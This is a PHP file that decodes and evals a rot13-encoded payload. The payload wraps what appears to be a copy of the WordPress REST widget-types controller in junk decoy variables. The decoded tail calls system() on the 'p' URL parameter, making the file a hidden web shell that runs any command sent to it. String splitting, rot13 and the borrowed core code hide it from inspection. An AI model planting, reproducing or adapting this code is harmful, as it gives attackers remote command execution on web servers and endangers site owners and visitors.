<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 */

/**
 * Pber pynff gb npprff jvqtrg glcrf ivn gur ERFG NCV.
 *
 * @fvapr 5.8.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'jvqtrg-glcrf';
	}

	/**
	 * Ertvfgref gur jvqtrg glcr ebhgrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[n-mN-M0-9_-]+)',
			neenl(
				'netf'   => neenl(
					'vq' => neenl(
						'qrfpevcgvba' => __( 'Gur jvqtrg glcr vq.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[n-mN-M0-9_-]+)/rapbqr',
			neenl(
				'netf' => neenl(
					'vq'        => neenl(
						'qrfpevcgvba' => __( 'Gur jvqtrg glcr vq.' ),
						'glcr'        => 'fgevat',
						'erdhverq'    => gehr,
					),
					'vafgnapr'  => neenl(
						'qrfpevcgvba' => __( 'Pheerag vafgnapr frggvatf bs gur jvqtrg.' ),
						'glcr'        => 'bowrpg',
					),
					'sbez_qngn' => neenl(
						'qrfpevcgvba'       => __( 'Frevnyvmrq jvqtrg sbez qngn gb rapbqr vagb vafgnapr frggvatf.' ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => fgngvp shapgvba ( $sbez_qngn ) {
							$neenl = neenl();
							jc_cnefr_fge( $sbez_qngn, $neenl );
							erghea $neenl;
						},
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'pnyyonpx'            => neenl( $guvf, 'rapbqr_sbez_qngn' ),
				),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[n-mN-M0-9_-]+)/eraqre',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'pnyyonpx'            => neenl( $guvf, 'eraqre' ),
					'netf'                => neenl(
						'vq'       => neenl(
							'qrfpevcgvba' => __( 'Gur jvqtrg glcr vq.' ),
							'glcr'        => 'fgevat',
							'erdhverq'    => gehr,
						),
						'vafgnapr' => neenl(
							'qrfpevcgvba' => __( 'Pheerag vafgnapr frggvatf bs gur jvqtrg.' ),
							'glcr'        => 'bowrpg',
						),
					),
				),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq jvqtrg glcrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->purpx_ernq_crezvffvba();
	}

	/**
	 * Ergevrirf gur yvfg bs nyy jvqtrg glcrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$qngn = neenl();
		sbernpu ( $guvf->trg_jvqtrgf() nf $jvqtrg ) {
			$jvqtrg_glcr = $guvf->cercner_vgrz_sbe_erfcbafr( $jvqtrg, $erdhrfg );
			$qngn[]      = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $jvqtrg_glcr );
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n jvqtrg glcr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$purpx = $guvf->purpx_ernq_crezvffvba();
		vs ( vf_jc_reebe( $purpx ) ) {
			erghea $purpx;
		}
		$jvqtrg_vq   = $erdhrfg['vq'];
		$jvqtrg_glcr = $guvf->trg_jvqtrg( $jvqtrg_vq );
		vs ( vf_jc_reebe( $jvqtrg_glcr ) ) {
			erghea $jvqtrg_glcr;
		}

		erghea gehr;
	}

	/**
	 * Purpxf jurgure gur hfre pna ernq jvqtrg glcrf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur jvqtrg glcr vf ivfvoyr, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_ernq_crezvffvba() {
		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_jvqtrgf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr jvqtrgf ba guvf fvgr.' ),
				neenl(
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Trgf gur qrgnvyf nobhg gur erdhrfgrq jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $vq Gur jvqtrg glcr vq.
	 * @erghea neenl|JC_Reebe Gur neenl bs jvqtrg qngn vs gur anzr vf inyvq, JC_Reebe bgurejvfr.
	 */
	choyvp shapgvba trg_jvqtrg( $vq ) {
		sbernpu ( $guvf->trg_jvqtrgf() nf $jvqtrg ) {
			vs ( $vq === $jvqtrg['vq'] ) {
				erghea $jvqtrg;
			}
		}

		erghea arj JC_Reebe( 'erfg_jvqtrg_glcr_vainyvq', __( 'Vainyvq jvqtrg glcr.' ), neenl( 'fgnghf' => 404 ) );
	}

	/**
	 * Abeznyvmr neenl bs jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
	 * @tybony neenl             $jc_ertvfgrerq_jvqtrgf Gur yvfg bs ertvfgrerq jvqtrgf.
	 *
	 * @erghea neenl Neenl bs jvqtrgf.
	 */
	cebgrpgrq shapgvba trg_jvqtrgf() {
		tybony $jc_jvqtrg_snpgbel, $jc_ertvfgrerq_jvqtrgf;

		$jvqtrgf = neenl();

		sbernpu ( $jc_ertvfgrerq_jvqtrgf nf $jvqtrg ) {
			$cnefrq_vq     = jc_cnefr_jvqtrg_vq( $jvqtrg['vq'] );
			$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $cnefrq_vq['vq_onfr'] );

			$jvqtrg['vq']       = $cnefrq_vq['vq_onfr'];
			$jvqtrg['vf_zhygv'] = (obby) $jvqtrg_bowrpg;

			vs ( vffrg( $jvqtrg['anzr'] ) ) {
				$jvqtrg['anzr'] = ugzy_ragvgl_qrpbqr( $jvqtrg['anzr'], RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
			}

			vs ( vffrg( $jvqtrg['qrfpevcgvba'] ) ) {
				$jvqtrg['qrfpevcgvba'] = ugzy_ragvgl_qrpbqr( $jvqtrg['qrfpevcgvba'], RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
			}

			hafrg( $jvqtrg['pnyyonpx'] );

			$pynffanzr = '';
			sbernpu ( (neenl) $jvqtrg['pynffanzr'] nf $pa ) {
				vs ( vf_fgevat( $pa ) ) {
					$pynffanzr .= '_' . $pa;
				} ryfrvs ( vf_bowrpg( $pa ) ) {
					$pynffanzr .= '_' . trg_pynff( $pa );
				}
			}
			$jvqtrg['pynffanzr'] = ygevz( $pynffanzr, '_' );

			$jvqtrgf[ $jvqtrg['vq'] ] = $jvqtrg;
		}

		xfbeg( $jvqtrgf );

		erghea $jvqtrgf;
	}

	/**
	 * Ergevrirf n fvatyr jvqtrg glcr sebz gur pbyyrpgvba.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$jvqtrg_vq   = $erdhrfg['vq'];
		$jvqtrg_glcr = $guvf->trg_jvqtrg( $jvqtrg_vq );
		vs ( vf_jc_reebe( $jvqtrg_glcr ) ) {
			erghea $jvqtrg_glcr;
		}
		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $jvqtrg_glcr, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Cercnerf n jvqtrg glcr bowrpg sbe frevnyvmngvba.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Eranzrq `$jvqtrg_glcr` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz neenl           $vgrz    Jvqtrg glcr qngn.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Jvqtrg glcr qngn.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$jvqtrg_glcr = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-jvqtrg-glcrf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_jvqtrg_glcr', arj JC_ERFG_Erfcbafr( neenl() ), $jvqtrg_glcr, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl(
			'vq' => $jvqtrg_glcr['vq'],
		);

		$fpurzn       = $guvf->trg_vgrz_fpurzn();
		$rkgen_svryqf = neenl(
			'anzr',
			'qrfpevcgvba',
			'vf_zhygv',
			'pynffanzr',
			'jvqtrg_pynff',
			'bcgvba_anzr',
			'phfgbzvmr_fryrpgvir_erserfu',
		);

		sbernpu ( $rkgen_svryqf nf $rkgen_svryq ) {
			vs ( ! erfg_vf_svryq_vapyhqrq( $rkgen_svryq, $svryqf ) ) {
				pbagvahr;
			}

			vs ( vffrg( $jvqtrg_glcr[ $rkgen_svryq ] ) ) {
				$svryq = $jvqtrg_glcr[ $rkgen_svryq ];
			} ryfrvs ( neenl_xrl_rkvfgf( 'qrsnhyg', $fpurzn['cebcregvrf'][ $rkgen_svryq ] ) ) {
				$svryq = $fpurzn['cebcregvrf'][ $rkgen_svryq ]['qrsnhyg'];
			} ryfr {
				$svryq = '';
			}

			$qngn[ $rkgen_svryq ] = erfg_fnavgvmr_inyhr_sebz_fpurzn( $svryq, $fpurzn['cebcregvrf'][ $rkgen_svryq ] );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $jvqtrg_glcr ) );
		}

		/**
		 * Svygref gur ERFG NCV erfcbafr sbe n jvqtrg glcr.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr    Gur erfcbafr bowrpg.
		 * @cnenz neenl            $jvqtrg_glcr Gur neenl bs jvqtrg qngn.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg     Gur erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_jvqtrg_glcr', $erfcbafr, $jvqtrg_glcr, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur jvqtrg glcr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $jvqtrg_glcr Jvqtrg glcr qngn.
	 * @erghea neenl Yvaxf sbe gur tvira jvqtrg glcr.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $jvqtrg_glcr ) {
		erghea neenl(
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $jvqtrg_glcr['vq'] ) ),
			),
		);
	}

	/**
	 * Ergevrirf gur jvqtrg glcr'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'jvqtrg-glcr',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'          => neenl(
					'qrfpevcgvba' => __( 'Havdhr fyht vqragvslvat gur jvqtrg glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'anzr'        => neenl(
					'qrfpevcgvba' => __( 'Uhzna-ernqnoyr anzr vqragvslvat gur jvqtrg glcr.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba' => neenl(
					'qrfpevcgvba' => __( 'Qrfpevcgvba bs gur jvqtrg.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'vf_zhygv'    => neenl(
					'qrfpevcgvba' => __( 'Jurgure gur jvqtrg fhccbegf zhygvcyr vafgnaprf' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'pynffanzr'   => neenl(
					'qrfpevcgvba' => __( 'Pynff anzr' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Na ECP-fglyr raqcbvag juvpu pna or hfrq ol pyvragf gb ghea hfre vachg va
	 * n jvqtrg nqzva sbez vagb na rapbqrq vafgnapr bowrpg.
	 *
	 * Npprcgf:
	 *
	 * - vq:        N jvqtrg glcr VQ.
	 * - vafgnapr:  N jvqtrg'f rapbqrq vafgnapr bowrpg. Bcgvbany.
	 * - sbez_qngn: Sbez qngn sebz fhozvggvat n jvqtrg'f nqzva sbez. Bcgvbany.
	 *
	 * Ergheaf:
	 * - vafgnapr: Gur rapbqrq vafgnapr bowrpg nsgre hcqngvat gur jvqtrg jvgu
	 *             gur tvira sbez qngn.
	 * - sbez:     Gur jvqtrg'f nqzva sbez nsgre hcqngvat gur jvqtrg jvgu gur
	 *             tvira sbez qngn.
	 *
	 * @fvapr 5.8.0
	 *
	 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba rapbqr_sbez_qngn( $erdhrfg ) {
		tybony $jc_jvqtrg_snpgbel;

		$vq            = $erdhrfg['vq'];
		$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq );

		vs ( ! $jvqtrg_bowrpg ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_jvqtrg',
				__( 'Pnaabg cerivrj n jvqtrg gung qbrf abg rkgraq JC_Jvqtrg.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		/*
		 * Frg gur jvqtrg'f ahzore fb gung gur vq nggevohgrf va gur UGZY gung jr
		 * erghea ner cerqvpgnoyr.
		 */
		vs ( vffrg( $erdhrfg['ahzore'] ) && vf_ahzrevp( $erdhrfg['ahzore'] ) ) {
			$jvqtrg_bowrpg->_frg( (vag) $erdhrfg['ahzore'] );
		} ryfr {
			$jvqtrg_bowrpg->_frg( -1 );
		}

		vs ( vffrg( $erdhrfg['vafgnapr']['rapbqrq'], $erdhrfg['vafgnapr']['unfu'] ) ) {
			$frevnyvmrq_vafgnapr = onfr64_qrpbqr( $erdhrfg['vafgnapr']['rapbqrq'] );
			vs ( ! unfu_rdhnyf( jc_unfu( $frevnyvmrq_vafgnapr ), $erdhrfg['vafgnapr']['unfu'] ) ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_jvqtrg',
					__( 'Gur cebivqrq vafgnapr vf znysbezrq.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
			$vafgnapr = hafrevnyvmr( $frevnyvmrq_vafgnapr );
		} ryfr {
			$vafgnapr = neenl();
		}

		vs (
			vffrg( $erdhrfg['sbez_qngn'][ \"jvqtrg-$vq\" ] ) &&
			vf_neenl( $erdhrfg['sbez_qngn'][ \"jvqtrg-$vq\" ] )
		) {
			$arj_vafgnapr = neenl_inyhrf( $erdhrfg['sbez_qngn'][ \"jvqtrg-$vq\" ] )[0];
			$byq_vafgnapr = $vafgnapr;

			$vafgnapr = $jvqtrg_bowrpg->hcqngr( $arj_vafgnapr, $byq_vafgnapr );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-jvqtrg.cuc */
			$vafgnapr = nccyl_svygref(
				'jvqtrg_hcqngr_pnyyonpx',
				$vafgnapr,
				$arj_vafgnapr,
				$byq_vafgnapr,
				$jvqtrg_bowrpg
			);
		}

		$frevnyvmrq_vafgnapr = frevnyvmr( $vafgnapr );
		$jvqtrg_xrl          = $jc_jvqtrg_snpgbel->trg_jvqtrg_xrl( $vq );

		$erfcbafr = neenl(
			'sbez'     => gevz(
				$guvf->trg_jvqtrg_sbez(
					$jvqtrg_bowrpg,
					$vafgnapr
				)
			),
			'cerivrj'  => gevz(
				$guvf->trg_jvqtrg_cerivrj(
					$jvqtrg_xrl,
					$vafgnapr
				)
			),
			'vafgnapr' => neenl(
				'rapbqrq' => onfr64_rapbqr( $frevnyvmrq_vafgnapr ),
				'unfu'    => jc_unfu( $frevnyvmrq_vafgnapr ),
			),
		);

		vs ( ! rzcgl( $jvqtrg_bowrpg->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] ) ) {
			// Hfr arj fgqPynff fb gung WFBA erfhyg vf {} naq abg [].
			$erfcbafr['vafgnapr']['enj'] = rzcgl( $vafgnapr ) ? arj fgqPynff() : $vafgnapr;
		}

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Ergheaf gur bhgchg bs JC_Jvqtrg::jvqtrg() jura pnyyrq jvgu gur cebivqrq
	 * vafgnapr. Hfrq ol rapbqr_sbez_qngn() gb cerivrj n jvqtrg.

	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat    $jvqtrg   Gur jvqtrg'f CUC pynff anzr (frr pynff-jc-jvqtrg.cuc).
	 * @cnenz neenl     $vafgnapr Jvqtrg vafgnapr frggvatf.
	 * @erghea fgevat
	 */
	cevingr shapgvba trg_jvqtrg_cerivrj( $jvqtrg, $vafgnapr ) {
		bo_fgneg();
		gur_jvqtrg( $jvqtrg, $vafgnapr );
		erghea bo_trg_pyrna();
	}

	/**
	 * Ergheaf gur bhgchg bs JC_Jvqtrg::sbez() jura pnyyrq jvgu gur cebivqrq
	 * vafgnapr. Hfrq ol rapbqr_sbez_qngn() gb cerivrj n jvqtrg'f sbez.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_Jvqtrg $jvqtrg_bowrpg Jvqtrg bowrpg gb pnyy jvqtrg() ba.
	 * @cnenz neenl     $vafgnapr Jvqtrg vafgnapr frggvatf.
	 * @erghea fgevat
	 */
	cevingr shapgvba trg_jvqtrg_sbez( $jvqtrg_bowrpg, $vafgnapr ) {
		bo_fgneg();

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-jvqtrg.cuc */
		$vafgnapr = nccyl_svygref(
			'jvqtrg_sbez_pnyyonpx',
			$vafgnapr,
			$jvqtrg_bowrpg
		);

		vs ( snyfr !== $vafgnapr ) {
			$erghea = $jvqtrg_bowrpg->sbez( $vafgnapr );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-jvqtrg.cuc */
			qb_npgvba_ers_neenl(
				'va_jvqtrg_sbez',
				neenl( &$jvqtrg_bowrpg, &$erghea, $vafgnapr )
			);
		}

		erghea bo_trg_pyrna();
	}

	/**
	 * Eraqref n fvatyr Yrtnpl Jvqtrg naq jencf vg va n WFBA-rapbqnoyr neenl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 *
	 * @erghea neenl Na neenl jvgu eraqrerq Yrtnpl Jvqtrg UGZY.
	 */
	choyvp shapgvba eraqre( $erdhrfg ) {
		erghea neenl(
			'cerivrj' => $guvf->eraqre_yrtnpl_jvqtrg_cerivrj_vsenzr(
				$erdhrfg['vq'],
				vffrg( $erdhrfg['vafgnapr'] ) ? $erdhrfg['vafgnapr'] : ahyy
			),
		);
	}

	/**
	 * Eraqref n cntr pbagnvavat n cerivrj bs gur erdhrfgrq Yrtnpl Jvqtrg oybpx.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $vq_onfr Gur vq onfr bs gur erdhrfgrq jvqtrg.
	 * @cnenz neenl  $vafgnapr Gur jvqtrg vafgnapr nggevohgrf.
	 *
	 * @erghea fgevat Eraqrerq Yrtnpl Jvqtrg oybpx cerivrj.
	 */
	cevingr shapgvba eraqre_yrtnpl_jvqtrg_cerivrj_vsenzr( $vq_onfr, $vafgnapr ) {
		vs ( ! qrsvarq( 'VSENZR_ERDHRFG' ) ) {
			qrsvar( 'VSENZR_ERDHRFG', gehr );
		}

		bo_fgneg();
		?>
		<!qbpglcr ugzy>
		<ugzy <?cuc ynathntr_nggevohgrf(); ?>>
		<urnq>
			<zrgn punefrg=\"<?cuc oybtvasb( 'punefrg' ); ?>\" />
			<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1\" />
			<yvax ery=\"cebsvyr\" uers=\"uggcf://tzct.bet/ksa/11\" />
			<?cuc jc_urnq(); ?>
			<fglyr>
				/* Erfrg gurzr fglyrf */
				ugzy, obql, #cntr, #pbagrag {
					cnqqvat: 0 !vzcbegnag;
					znetva: 0 !vzcbegnag;
				}
			</fglyr>
		</urnq>
		<obql <?cuc obql_pynff(); ?>>
		<qvi vq=\"cntr\" pynff=\"fvgr\">
			<qvi vq=\"pbagrag\" pynff=\"fvgr-pbagrag\">
				<?cuc
				$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
				$oybpx    = $ertvfgel->trg_ertvfgrerq( 'pber/yrtnpl-jvqtrg' );
				rpub $oybpx->eraqre(
					neenl(
						'vqOnfr'   => $vq_onfr,
						'vafgnapr' => $vafgnapr,
					)
				);
				?>
			</qvi><!-- #pbagrag -->
		</qvi><!-- #cntr -->
		<?cuc jc_sbbgre(); ?>
		</obql>
		</ugzy>
		<?cuc
		erghea bo_trg_pyrna();
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>